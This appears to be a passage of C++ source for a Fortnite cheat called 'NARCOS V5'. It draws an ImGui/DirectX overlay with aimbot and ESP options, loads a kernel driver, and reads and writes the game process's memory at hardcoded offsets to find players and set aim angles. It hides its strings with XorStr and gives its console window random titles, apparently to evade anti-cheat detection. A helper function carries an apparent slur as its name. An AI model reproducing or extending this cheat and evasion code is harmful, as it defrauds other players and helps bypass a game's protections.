	ImGuiStyle* Style = &ImGui::GetStyle();
	Style->Colors[ImGuiCol_Button] = ImColor(55, 55, 55);
	Style->Colors[ImGuiCol_ButtonActive] = ImColor(55, 55, 55);
	Style->Colors[ImGuiCol_ButtonHovered] = ImColor(0, 0, 0);
}
void Hovered() {
	ImGuiStyle* Style = &ImGui::GetStyle();
	Style->Colors[ImGuiCol_Button] = ImColor(0, 0, 0);
	Style->Colors[ImGuiCol_ButtonActive] = ImColor(0, 0, 0);
	Style->Colors[ImGuiCol_ButtonHovered] = ImColor(55, 55, 55);
}

void Active1() {
	ImGuiStyle* Style = &ImGui::GetStyle();
	Style->Colors[ImGuiCol_Button] = ImColor(0, 55, 0);
	Style->Colors[ImGuiCol_ButtonActive] = ImColor(0, 55, 0);
	Style->Colors[ImGuiCol_ButtonHovered] = ImColor(55, 0, 0);
}
void Hovered1() {
	ImGuiStyle* Style = &ImGui::GetStyle();
	Style->Colors[ImGuiCol_Button] = ImColor(55, 0, 0);
	Style->Colors[ImGuiCol_ButtonActive] = ImColor(55, 0, 0);
	Style->Colors[ImGuiCol_ButtonHovered] = ImColor(0, 55, 0);
}

void render() {
	ImGui_ImplDX9_NewFrame();
	ImGui_ImplWin32_NewFrame();
	ImGui::NewFrame();
	ImGui::SetNextWindowSize({ 550, 750 });
	if (item.Show_Menu) {

		ImGui::StyleColorsClassic();
		ImGuiStyle* style = &ImGui::GetStyle();


		ImVec4* colors = style->Colors;

		ImVec4* colorz = ImGui::GetStyle().Colors;
		colors[ImGuiCol_Text] = ImVec4(0.000f, 1.000f, 0.917f, 1.000f);
		colors[ImGuiCol_TextDisabled] = ImVec4(0.50f, 0.50f, 0.50f, 1.00f);
		colors[ImGuiCol_WindowBg] = ImVec4(0.06f, 0.06f, 0.06f, 0.94f);
		colors[ImGuiCol_ChildBg] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
		colors[ImGuiCol_PopupBg] = ImVec4(0.08f, 0.08f, 0.08f, 0.94f);
		colors[ImGuiCol_Border] = ImVec4(0.000f, 1.000f, 0.917f, 1.000f);
		colors[ImGuiCol_BorderShadow] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
		colors[ImGuiCol_FrameBg] = ImVec4(0.00f, 0.00f, 0.00f, 0.54f);
		colors[ImGuiCol_FrameBgHovered] = ImVec4(0.41f, 1.00f, 0.00f, 0.19f);
		colors[ImGuiCol_FrameBgActive] = ImVec4(0.000f, 1.000f, 0.917f, 1.000f);
		colors[ImGuiCol_TitleBg] = ImVec4(0.04f, 0.04f, 0.04f, 1.00f);
		colors[ImGuiCol_TitleBgActive] = ImVec4(0.00f, 0.00f, 0.00f, 1.00f);
		colors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.00f, 0.00f, 0.00f, 0.51f);
		colors[ImGuiCol_MenuBarBg] = ImVec4(0.14f, 0.14f, 0.14f, 1.00f);
		colors[ImGuiCol_ScrollbarBg] = ImVec4(0.02f, 0.02f, 0.02f, 0.53f);
		colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.31f, 0.31f, 0.31f, 1.00f);
		colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.41f, 0.41f, 0.41f, 1.00f);
		colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.51f, 0.51f, 0.51f, 1.00f);
		colors[ImGuiCol_CheckMark] = ImVec4(0.000f, 1.000f, 0.917f, 1.000f);
		colors[ImGuiCol_SliderGrab] = ImVec4(0.000f, 1.000f, 0.917f, 1.000f);
		colors[ImGuiCol_SliderGrabActive] = ImVec4(0.000f, 1.000f, 0.917f, 1.000f);
		colors[ImGuiCol_Button] = ImVec4(0.26f, 0.59f, 0.98f, 0.40f);
		colors[ImGuiCol_ButtonHovered] = ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
		colors[ImGuiCol_ButtonActive] = ImVec4(0.06f, 0.53f, 0.98f, 1.00f);
		colors[ImGuiCol_Header] = ImVec4(0.000f, 1.000f, 0.917f, 1.000f);
		colors[ImGuiCol_HeaderHovered] = ImVec4(0.000f, 1.000f, 0.917f, 1.000f);
		colors[ImGuiCol_HeaderActive] = ImVec4(0.000f, 1.000f, 0.917f, 1.000f);
		colors[ImGuiCol_Separator] = ImVec4(0.000f, 1.000f, 0.917f, 1.000f);
		colors[ImGuiCol_SeparatorHovered] = ImVec4(0.000f, 1.000f, 0.917f, 1.000f);
		colors[ImGuiCol_SeparatorActive] = ImVec4(0.000f, 1.000f, 0.917f, 1.000f);
		colors[ImGuiCol_ResizeGrip] = ImVec4(0.000f, 1.000f, 0.917f, 1.000f);
		colors[ImGuiCol_ResizeGripHovered] = ImVec4(0.000f, 1.000f, 0.917f, 1.000f);
		colors[ImGuiCol_ResizeGripActive] = ImVec4(0.000f, 1.000f, 0.917f, 1.000f);
		colors[ImGuiCol_Tab] = ImVec4(0.000f, 1.000f, 0.917f, 1.000f);
		colors[ImGuiCol_TabHovered] = ImVec4(0.98f, 0.26f, 0.26f, 0.80f);
		colors[ImGuiCol_TabActive] = ImVec4(0.000f, 1.000f, 0.917f, 1.000f);
		colors[ImGuiCol_TabUnfocused] = ImVec4(0.07f, 0.10f, 0.15f, 0.97f);
		colors[ImGuiCol_TabUnfocusedActive] = ImVec4(0.14f, 0.26f, 0.42f, 1.00f);
		colors[ImGuiCol_PlotLines] = ImVec4(0.61f, 0.61f, 0.61f, 1.00f);
		colors[ImGuiCol_PlotLinesHovered] = ImVec4(1.00f, 0.43f, 0.35f, 1.00f);
		colors[ImGuiCol_PlotHistogram] = ImVec4(0.90f, 0.70f, 0.00f, 1.00f);
		colors[ImGuiCol_PlotHistogramHovered] = ImVec4(1.00f, 0.60f, 0.00f, 1.00f);
		colors[ImGuiCol_TextSelectedBg] = ImVec4(0.000f, 1.000f, 0.917f, 1.000f);
		colors[ImGuiCol_DragDropTarget] = ImVec4(1.00f, 1.00f, 0.00f, 0.90f);
		colors[ImGuiCol_NavHighlight] = ImVec4(0.000f, 1.000f, 0.917f, 1.000f);
		colors[ImGuiCol_NavWindowingHighlight] = ImVec4(1.00f, 1.00f, 1.00f, 0.70f);
		colors[ImGuiCol_NavWindowingDimBg] = ImVec4(0.80f, 0.80f, 0.80f, 0.20f);
		colors[ImGuiCol_ModalWindowDimBg] = ImVec4(0.80f, 0.80f, 0.80f, 0.35f);

		ImGuiStyle* stylez = &ImGui::GetStyle();
		style->WindowRounding = 0.0f;
		style->FrameRounding = 0.0f;
		style->PopupRounding = 0.0f;
		style->GrabRounding = 1.0f;













		{
			char dist[64];
			ImGui::Begin(XorStr("NARCOS V5").c_str(), 0, ImGuiWindowFlags_::ImGuiWindowFlags_NoResize | ImGuiWindowFlags_::ImGuiWindowFlags_NoCollapse);
			ImGui::Separator();
			ImGui::GetOverlayDrawList()->AddText(ImVec2(15, 15), ImGui::GetColorU32({ color.Black[0], color.Black[1], color.Black[2], 4.0f }), dist);
			ImGui::Text(XorStr("Aim Settings ").c_str());
			

			ImGui::Checkbox(XorStr("SoftAim").c_str(), &item.Aimbot);
			ImGui::Checkbox(XorStr("FOV").c_str(), &item.Draw_FOV_Circle);
			ImGui::Checkbox("Crosshair", &item.Cross_Hair);


			ImGui::SliderFloat("Aim Fov", &item.AimFOV, 25, 999);

			if (item.Aim_Speed)
			{
				ImGui::SliderFloat("Smooth", &item.Aim_Speed, 2, 50);

			}
			

			ImGui::Separator();

			ImGui::Text(XorStr("ESP").c_str());
		

			ImGui::Checkbox(XorStr("Box ESP").c_str(), &item.Esp_Corner_Box);
			ImGui::Checkbox(XorStr("Snaplines").c_str(), &item.Esp_line);
			ImGui::Checkbox(XorStr("Player").c_str(), &item.Team_Distance_Esp);
			ImGui::Checkbox(XorStr("Distance ESP").c_str(), &item.Distance_Esp);


			if (item.VisDist)
			{
				ImGui::SliderFloat("Esp Distance", &item.VisDist, 1, 600);
			}


			if (ImGui::Button("Join Discord"))
			{
				system("start (Discord Link)");
			}

			ImGui::End();
		}
	}
	GetKey();

	ImGui::EndFrame();
	D3dDevice->SetRenderState(D3DRS_ZENABLE, false);
	D3dDevice->SetRenderState(D3DRS_ALPHABLENDENABLE, false);
	D3dDevice->SetRenderState(D3DRS_SCISSORTESTENABLE, false);
	D3dDevice->Clear(0, NULL, D3DCLEAR_TARGET, D3DCOLOR_ARGB(0, 0, 0, 0), 1.0f, 0);

	if (D3dDevice->BeginScene() >= 0) {
		ImGui::Render();
		ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
		D3dDevice->EndScene();
	}
	HRESULT result = D3dDevice->Present(NULL, NULL, NULL, NULL);

	if (result == D3DERR_DEVICELOST && D3dDevice->TestCooperativeLevel() == D3DERR_DEVICENOTRESET) {
		ImGui_ImplDX9_InvalidateDeviceObjects();
		D3dDevice->Reset(&d3dpp);
		ImGui_ImplDX9_CreateDeviceObjects();
	}
}

void xInitD3d()
{
	if (FAILED(Direct3DCreate9Ex(D3D_SDK_VERSION, &p_Object)))
		exit(3);

	ZeroMemory(&d3dpp, sizeof(d3dpp));
	d3dpp.BackBufferWidth = Width;
	d3dpp.BackBufferHeight = Height;
	d3dpp.BackBufferFormat = D3DFMT_A8R8G8B8;
	d3dpp.MultiSampleQuality = D3DMULTISAMPLE_NONE;
	d3dpp.AutoDepthStencilFormat = D3DFMT_D16;
	d3dpp.SwapEffect = D3DSWAPEFFECT_DISCARD;
	d3dpp.EnableAutoDepthStencil = TRUE;
	d3dpp.hDeviceWindow = Window;
	d3dpp.Windowed = TRUE;

	p_Object->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, Window, D3DCREATE_SOFTWARE_VERTEXPROCESSING, &d3dpp, &D3dDevice);

	IMGUI_CHECKVERSION();

	ImGui::CreateContext();
	ImGuiIO& io = ImGui::GetIO();
	(void)io;

	ImGui_ImplWin32_Init(Window);
	ImGui_ImplDX9_Init(D3dDevice);

	ImGui::StyleColorsClassic();
	ImGuiStyle* style = &ImGui::GetStyle();

	style->WindowPadding = ImVec2(15, 15);
	style->WindowRounding = 7.0f;
	style->FramePadding = ImVec2(5, 5);
	style->FrameRounding = 6.0f;
	style->ItemSpacing = ImVec2(12, 8);
	style->ItemInnerSpacing = ImVec2(8, 6);
	style->IndentSpacing = 25.0f;
	style->ScrollbarSize = 15.0f;
	style->ScrollbarRounding = 9.0f;
	style->GrabMinSize = 5.0f;
	style->GrabRounding = 3.0f;

	ImVec4* colors = style->Colors;

	colors[ImGuiCol_Text] = ImVec4(0.92f, 0.92f, 0.92f, 1.00f);
	colors[ImGuiCol_TextDisabled] = ImVec4(0.50f, 0.50f, 0.50f, 1.00f);
	colors[ImGuiCol_WindowBg] = ImVec4(0.26f, 0.26f, 0.26f, 0.95f);
	colors[ImGuiCol_ChildWindowBg] = ImVec4(0.9f, 0.5f, 0.0f, 1.00f);
	colors[ImGuiCol_PopupBg] = ImVec4(0.26f, 0.26f, 0.26f, 1.00f);
	colors[ImGuiCol_Border] = ImVec4(0.26f, 0.26f, 0.26f, 1.00f);
	colors[ImGuiCol_BorderShadow] = ImVec4(0.26f, 0.26f, 0.26f, 1.00f);
	colors[ImGuiCol_FrameBg] = ImVec4(0.16f, 0.16f, 0.16f, 1.00f);
	colors[ImGuiCol_FrameBgHovered] = ImVec4(0.16f, 0.16f, 0.16f, 1.00f);
	colors[ImGuiCol_FrameBgActive] = ImVec4(0.16f, 0.16f, 0.16f, 1.00f);
	colors[ImGuiCol_TitleBg] = ImVec4(0.06f, 0.00f, 0.00f, 0.83f);
	colors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.06f, 0.00f, 0.00f, 0.83f);
	colors[ImGuiCol_TitleBgActive] = ImVec4(0.06f, 0.00f, 0.00f, 0.83f);
	colors[ImGuiCol_MenuBarBg] = ImVec4(0.92f, 0.92f, 0.92f, 1.00f);
	colors[ImGuiCol_ScrollbarBg] = ImVec4(0.21f, 0.21f, 0.21f, 1.00f);
	colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
	colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
	colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
	colors[ImGuiCol_CheckMark] = ImVec4(0.9f, 0.5f, 0.0f, 1.00f);
	colors[ImGuiCol_SliderGrab] = ImVec4(158.0f, 154.0f, 138.0f, 1.0f);
	colors[ImGuiCol_SliderGrabActive] = ImVec4(0.74f, 0.74f, 0.74f, 1.00f);
	colors[ImGuiCol_Button] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
	colors[ImGuiCol_ButtonHovered] = ImVec4(0.43f, 0.43f, 0.43f, 1.00f);
	colors[ImGuiCol_ButtonActive] = ImVec4(0.11f, 0.11f, 0.11f, 1.00f);
	colors[ImGuiCol_Header] = ImVec4(0.9f, 0.5f, 0.0f, 1.00f);
	colors[ImGuiCol_HeaderHovered] = ImVec4(0.9f, 0.5f, 0.0f, 1.00f);
	colors[ImGuiCol_HeaderActive] = ImVec4(0.9f, 0.5f, 0.0f, 1.00f);
	colors[ImGuiCol_Column] = ImVec4(0.39f, 0.39f, 0.39f, 1.00f);
	colors[ImGuiCol_ColumnHovered] = ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
	colors[ImGuiCol_ColumnActive] = ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
	colors[ImGuiCol_ResizeGrip] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
	colors[ImGuiCol_ResizeGripHovered] = ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
	colors[ImGuiCol_ResizeGripActive] = ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
	colors[ImGuiCol_PlotLines] = ImVec4(0.39f, 0.39f, 0.39f, 1.00f);
	colors[ImGuiCol_PlotLinesHovered] = ImVec4(1.00f, 0.43f, 0.35f, 1.00f);
	colors[ImGuiCol_PlotHistogram] = ImVec4(0.90f, 0.70f, 0.00f, 1.00f);
	colors[ImGuiCol_PlotHistogramHovered] = ImVec4(1.00f, 0.60f, 0.00f, 1.00f);
	colors[ImGuiCol_TextSelectedBg] = ImVec4(0.32f, 0.52f, 0.65f, 1.00f);
	colors[ImGuiCol_ModalWindowDarkening] = ImVec4(0.20f, 0.20f, 0.20f, 0.50f);


	style->WindowTitleAlign.x = 0.5f;
	style->FrameRounding = 6.5f;


	p_Object->Release();
}

LPCSTR RandomStringx(int len) {
	std::string str = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	std::string newstr;
	std::string builddate = __DATE__;
	std::string buildtime = __TIME__;
	int pos;
	while (newstr.size() != len) {
		pos = ((rand() % (str.size() - 1)));
		newstr += str.substr(pos, 1);
	}
	return newstr.c_str();
}



int width;
int height;




void drawLoop(int width, int height) {


	while (true) {
		std::vector<FNlEntity> tmpList;

		Uworld = rpm<DWORD_PTR>(base_address + OFFSET_UWORLD);
		DWORD_PTR Gameinstance = rpm<DWORD_PTR>(Uworld + 0x190);
		DWORD_PTR LocalPlayers = rpm<DWORD_PTR>(Gameinstance + 0x38);
		Localplayer = rpm<DWORD_PTR>(LocalPlayers);
		PlayerController = rpm<DWORD_PTR>(Localplayer + 0x30);
		LocalPawn = rpm<DWORD_PTR>(PlayerController + 0x2A8);

		PlayerState = rpm<DWORD_PTR>(LocalPawn + 0x238);
		Rootcomp = rpm<DWORD_PTR>(LocalPawn + 0x130);

		if (LocalPawn != 0) {
			localplayerID = rpm<int>(LocalPawn + 0x18);
		}

		Persistentlevel = rpm<DWORD_PTR>(Uworld + 0x30);
		DWORD ActorCount = rpm<DWORD>(Persistentlevel + 0xA0);
		DWORD_PTR AActors = rpm<DWORD_PTR>(Persistentlevel + 0x98);

		for (int i = 0; i < ActorCount; i++) {
			uint64_t CurrentActor = rpm<uint64_t>(AActors + i * 0x8);

			int curactorid = rpm<int>(CurrentActor + 0x18);

			if (curactorid == localplayerID || curactorid == localplayerID + 765) {
				FNlEntity fnlEntity{ };
				fnlEntity.Actor = CurrentActor;
				fnlEntity.mesh = rpm<uint64_t>(CurrentActor + 0x280);
				fnlEntity.ID = curactorid;
				tmpList.push_back(fnlEntity);
			}
		}
		entityList = tmpList;
		Sleep(1);
	}


}
std::string getuser()
{
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	return username;
}

void main() {

	system("cls");
	tasky1();
	nignog1();
	SetConsoleTitleA(random_string(50).c_str());
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_GREEN);
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_GREEN);
	std::cout << XorStr("[+] Hi - ");
	std::cout << getuser();
	std::cout << XorStr(" Im loading content ");
	Sleep(2000);
	system("cls");
	nignog1();
	BlockInput(true);
	SetCursorPos(0, 0);
	Sleep(500);
	Sleep(500);
	BlockInput(false);
	Sleep(1000);
	system(XorStr("cls").c_str());
	loaddriver();


	printf(XorStr("\n\n [+]D").c_str());
	Sleep(100);
	printf(XorStr("r").c_str());
	Sleep(100);
	printf(XorStr("i").c_str());
	Sleep(100);
	printf(XorStr("v").c_str());
	Sleep(100);
	printf(XorStr("e").c_str());
	Sleep(100);
	printf(XorStr("r").c_str());
	Sleep(100);
	printf(XorStr(" ").c_str());
	Sleep(100);
	printf(XorStr("L").c_str());
	Sleep(100);
	printf(XorStr("o").c_str());
	Sleep(100);
	printf(XorStr("a").c_str());
	Sleep(100);
	printf(XorStr("d").c_str());
	Sleep(100);
	printf(XorStr("e").c_str());
	Sleep(100);
	printf(XorStr("d").c_str());
	Sleep(100);
	printf(XorStr(" ").c_str());
	printf(XorStr("A").c_str());
	Sleep(100);
	printf(XorStr("l").c_str());
	Sleep(100);
	printf(XorStr("r").c_str());
	Sleep(100);
	printf(XorStr("e").c_str());
	Sleep(100);
	printf(XorStr("a").c_str());
	Sleep(100);
	printf(XorStr("d").c_str());
	Sleep(100);
	printf(XorStr("y").c_str());
	tasky1();
	Sleep(200);
	system("cls");
	nignog1();
	BlockInput(true);
	SetCursorPos(0, 0);
	Sleep(500);
	Sleep(500);
	BlockInput(false);
	Sleep(1000);
	system(XorStr("cls").c_str());
	std::cout << XorStr(" waiting for FortniteClient-Win64-Shipping.exe ");
	tasky1();
	nignog1();
	proc = std::make_unique<kernelmode_proc_handler>();

	proc->attach(XorStr("FortniteClient-Win64-Shipping.exe").c_str());

	tasky1();
	nignog1();

	while (hwnd == NULL)
	{
		hwnd = FindWindowA(0, XorStr("Fortnite  ").c_str());


		Sleep(300);
	}
	GetWindowThreadProcessId(hwnd, &processID);

	RECT rect;
	if (GetWindowRect(hwnd, &rect))
	{
		width = rect.right - rect.left;
		height = rect.bottom - rect.top;
	}

	info_t Input_Output_Data;
	Input_Output_Data.pid = processID;
	unsigned long int Readed_Bytes_Amount;

	base_address = proc->get_module_base(XorStr("FortniteClient-Win64-Shipping.exe").c_str());
	SetConsoleTitleA(random_string(200).c_str());
	tasky1();
	nignog1();
	system("cls");
	tasky1();
	nignog1();
	system("color c");
	tasky1();
	nignog1();
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_BLUE);
	std::cout << XorStr(" User - ");
	std::cout << getuser();
	tasky1();
	nignog1();
	std::cout << XorStr("\n\n\n\n [+] Injected ! ");

	tasky1();
	nignog1();

	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_INTENSITY | FOREGROUND_RED);

	tasky1();
	nignog1();
	CreateThread(NULL, NULL, Menuthread, NULL, NULL, NULL);
	GetWindowThreadProcessId(hwnd, &processID);

	tasky1();
	nignog1();

	xCreateWindow();
	xInitD3d();
	tasky1();
	nignog1();


	HANDLE handle = CreateThread(nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(drawLoop), nullptr, NULL, nullptr);


	xMainLoop();
}





void SetWindowToTarget()
{
	while (true)
	{
		if (hwnd)
		{
			ZeroMemory(&GameRect, sizeof(GameRect));
			GetWindowRect(hwnd, &GameRect);
			Width = GameRect.right - GameRect.left;
			Height = GameRect.bottom - GameRect.top;
			DWORD dwStyle = GetWindowLong(hwnd, GWL_STYLE);

			if (dwStyle & WS_BORDER)
			{
				GameRect.top += 32;
				Height -= 39;
			}
			ScreenCenterX = Width / 2;
			ScreenCenterY = Height / 2;
			MoveWindow(Window, GameRect.left, GameRect.top, Width, Height, true);
		}
		else
		{
			exit(0);
		}
	}
}

const MARGINS Margin = { -1 };

void xCreateWindow()
{
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SetWindowToTarget, 0, 0, 0);

	WNDCLASSEX wc;
	ZeroMemory(&wc, sizeof(wc));
	wc.cbSize = sizeof(wc);
	wc.lpszClassName = "Gideion";
	wc.lpfnWndProc = WinProc;
	RegisterClassEx(&wc);

	if (hwnd)
	{
		GetClientRect(hwnd, &GameRect);
		POINT xy;
		ClientToScreen(hwnd, &xy);
		GameRect.left = xy.x;
		GameRect.top = xy.y;

		Width = GameRect.right;
		Height = GameRect.bottom;
	}
	else
		exit(2);

	Window = CreateWindowEx(NULL, "Gideion", "Gideion1", WS_POPUP | WS_VISIBLE, 0, 0, Width, Height, 0, 0, 0, 0);

	DwmExtendFrameIntoClientArea(Window, &Margin);
	SetWindowLong(Window, GWL_EXSTYLE, WS_EX_TRANSPARENT | WS_EX_TOOLWINDOW | WS_EX_LAYERED);
	ShowWindow(Window, SW_SHOW);
	UpdateWindow(Window);
}

void WriteAngles(float TargetX, float TargetY, float TargetZ) {
	float x = TargetX / 6.666666666666667f;
	float y = TargetY / 6.666666666666667f;
	float z = TargetZ / 6.666666666666667f;
	y = -(y);

	writefloat(PlayerController + 0x418, y);
	writefloat(PlayerController + 0x418 + 0x4, x);
	writefloat(PlayerController + 0x418, z);
}

MSG Message = { NULL };

void xMainLoop()
{
	static RECT old_rc;
	ZeroMemory(&Message, sizeof(MSG));

	while (Message.message != WM_QUIT)
	{
		if (PeekMessage(&Message, Window, 0, 0, PM_REMOVE))
		{
			TranslateMessage(&Message);
			DispatchMessage(&Message);
		}

		HWND hwnd_active = GetForegroundWindow();

		if (hwnd_active == hwnd) {
			HWND hwndtest = GetWindow(hwnd_active, GW_HWNDPREV);
			SetWindowPos(Window, hwndtest, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		}

		if (GetAsyncKeyState(0x23) & 1)
			exit(8);

		RECT rc;
		POINT xy;

		ZeroMemory(&rc, sizeof(RECT));
		ZeroMemory(&xy, sizeof(POINT));
		GetClientRect(hwnd, &rc);
		ClientToScreen(hwnd, &xy);
		rc.left = xy.x;
		rc.top = xy.y;

		ImGuiIO& io = ImGui::GetIO();
		io.ImeWindowHandle = hwnd;
		io.DeltaTime = 1.0f / 60.0f;

		POINT p;
		GetCursorPos(&p);
		io.MousePos.x = p.x - xy.x;
		io.MousePos.y = p.y - xy.y;

		if (GetAsyncKeyState(VK_LBUTTON)) {
			io.MouseDown[0] = true;
			io.MouseClicked[0] = true;
			io.MouseClickedPos[0].x = io.MousePos.x;
			io.MouseClickedPos[0].x = io.MousePos.y;
		}
		else
			io.MouseDown[0] = false;

		if (rc.left != old_rc.left || rc.right != old_rc.right || rc.top != old_rc.top || rc.bottom != old_rc.bottom)
		{
			old_rc = rc;

			Width = rc.right;
			Height = rc.bottom;

			d3dpp.BackBufferWidth = Width;
			d3dpp.BackBufferHeight = Height;
			SetWindowPos(Window, (HWND)0, xy.x, xy.y, Width, Height, SWP_NOREDRAW);
			D3dDevice->Reset(&d3dpp);
		}
		render();
	}
	ImGui_ImplDX9_Shutdown();
	ImGui_ImplWin32_Shutdown();
	ImGui::DestroyContext();

	DestroyWindow(Window);
}

LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
	if (ImGui_ImplWin32_WndProcHandler(hWnd, Message, wParam, lParam))
		return true;

	switch (Message)
	{
	case WM_DESTROY:
		PostQuitMessage(0);
		exit(4);
		break;
	case WM_SIZE:
		if (D3dDevice != NULL && wParam != SIZE_MINIMIZED)
		{
			ImGui_ImplDX9_InvalidateDeviceObjects();
			d3dpp.BackBufferWidth = LOWORD(lParam);
			d3dpp.BackBufferHeight = HIWORD(lParam);
			HRESULT hr = D3dDevice->Reset(&d3dpp);
			if (hr == D3DERR_INVALIDCALL)
				IM_ASSERT(0);
			ImGui_ImplDX9_CreateDeviceObjects();
		}
		break;
	default:
		return DefWindowProc(hWnd, Message, wParam, lParam);
		break;
	}
	return 0;
}